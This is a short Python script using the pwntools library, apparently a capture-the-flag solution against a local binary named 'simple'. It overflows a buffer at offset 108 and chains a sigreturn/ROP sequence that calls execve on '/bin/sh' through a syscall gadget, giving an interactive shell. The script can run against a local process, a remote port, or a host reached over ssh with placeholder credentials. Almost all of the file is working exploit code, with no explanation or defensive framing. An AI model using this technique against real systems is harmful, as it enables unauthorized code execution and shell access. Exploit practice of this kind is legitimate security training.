#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/simple'

e = ELF('./build/simple')
rop = ROP('./build/simple')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5502)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/simple', cwd='problemDir')
else:
    p = e.process()


payload = flat({108: e.sym['srop']},59,0,0,0,next(e.search(b'/bin/sh')),0,0,rop.find_gadget(['syscall'])[0])
p.sendline(payload)
p.interactive()
